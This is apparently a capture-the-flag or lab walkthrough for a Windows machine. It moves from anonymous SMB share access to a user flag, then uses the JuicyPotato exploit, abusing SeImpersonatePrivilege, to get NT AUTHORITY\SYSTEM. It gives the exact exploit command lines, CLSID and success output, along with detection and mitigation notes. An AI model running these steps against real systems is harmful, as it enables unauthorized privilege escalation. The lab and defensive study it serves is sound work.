# CCP102-Windows-Privilege-Escalation-Walkthrough

Overview

This machine demonstrates a Windows privilege escalation scenario where a low-privileged IIS application pool account can escalate privileges to NT AUTHORITY\SYSTEM using the JuicyPotato exploit.

The attack abuses the SeImpersonatePrivilege, which allows a service account to impersonate privileged tokens from COM services.

Lab Information
Field	Value
Target	CCP102
OS	Windows
Access Type	SMB
Initial User	iis apppool\defaultapppool
Privilege Escalation	JuicyPotato
Final Access	NT AUTHORITY\SYSTEM
Attack Chain
SMB Enumeration
      ↓
Anonymous SMB Share Access
      ↓
Retrieve User Flag
      ↓
Shell as IIS AppPool
      ↓
Identify SeImpersonatePrivilege
      ↓
Exploit JuicyPotato
      ↓
Execute Command as SYSTEM
Step 1 – SMB Enumeration

First enumerate available SMB shares.

smbclient -L //TARGET-IP/ -N

Output:

Sharename       Type
---------       ----
ADMIN$          Disk
C$              Disk
data            Disk
IPC$            IPC
Users           Disk

The Users share appears accessible.

Step 2 – Anonymous SMB Access

Connect to the Users share.

smbclient //TARGET-IP/Users -N

Navigate to the Public directory.

smb: \> cd Public
smb: \Public\> dir

Files discovered:

local.txt
Documents
Downloads
Music
Pictures
Videos
Step 3 – User Flag

Download the flag.

get local.txt

Read the flag:

cat local.txt
c1148048309ce7045549583c526456d4

User flag obtained.

Step 4 – Initial Shell Context

The compromised shell is running under:

iis apppool\defaultapppool

This is a low privilege IIS service account commonly used by web applications.

Step 5 – Privilege Enumeration

Running privilege enumeration reveals:

SeImpersonatePrivilege

Example output:

Privilege Name              State
SeImpersonatePrivilege      Enabled

This privilege is commonly exploitable using Potato attacks.

Step 6 – JuicyPotato Exploit

JuicyPotato abuses Windows DCOM service impersonation.

Requirements:

SeImpersonatePrivilege
Windows Server 2008–2019
Accessible COM service
Upload Exploit

Transfer the exploit to the machine.

Example location:

C:\Users\Public\jp.exe
Step 7 – Execute JuicyPotato

Run the exploit:

.\jp.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"

Successful output:

[+] authresult 0
{e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

This confirms SYSTEM token impersonation succeeded.

Step 8 – Proof of SYSTEM Access

Execute command through JuicyPotato:

.\jp.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}" -a "/c whoami /all > C:\Users\Public\proof.txt"

Read the output:

type C:\Users\Public\proof.txt

Result:

USER INFORMATION
----------------
User Name           SID
nt authority\system S-1-5-18

This confirms SYSTEM privileges.

Step 9 – Enumerating Users

List available user directories.

dir C:\Users

Output:

DefaultAppPool
junior102
Public

The root flag is expected in:

C:\Users\junior102\Desktop\root.txt
MITRE ATT&CK Mapping
Technique	ID
Exploitation for Privilege Escalation	T1068
Abuse Elevation Control Mechanism	T1548
Token Impersonation	T1134
Windows Service Abuse	T1543
Vulnerability Explanation
SeImpersonatePrivilege Abuse

Windows services running under service accounts can impersonate tokens when handling authentication requests.

JuicyPotato tricks a privileged COM service into authenticating to a malicious listener, allowing the attacker to steal the SYSTEM token.

Detection

Security teams can detect this behavior using:

Suspicious Processes
JuicyPotato.exe
cmd.exe spawned from service account
Event Logs

Monitor:

Event ID 4672 – Special privileges assigned
Event ID 4688 – Suspicious process creation
Network Indicators

Unexpected RPC / COM traffic to localhost ports.

Mitigation

Prevent this attack by:

Disable SeImpersonatePrivilege

Limit impersonation privileges for service accounts.

Patch Windows

Modern Windows versions mitigate many Potato attacks.

Use Protected Service Accounts

Avoid running services under over-privileged accounts.

Endpoint Protection

EDR solutions should detect:

JuicyPotato
Rogue COM listeners
Token manipulation
Tools Used
Tool	Purpose
Nmap	Network scanning
SMBClient	SMB share access
JuicyPotato	Privilege escalation
PowerShell	Command execution
Screenshots (Recommended)
/screenshots
 ├── smb_enum.png
 ├── smb_access.png
 ├── local_flag.png
 ├── juicy_potato_execution.png
 ├── system_proof.png
Key Learning Points

Always enumerate SMB shares.

Check privileges using:

whoami /priv

SeImpersonatePrivilege often leads to Potato exploits.

IIS service accounts are frequent privilege escalation targets.
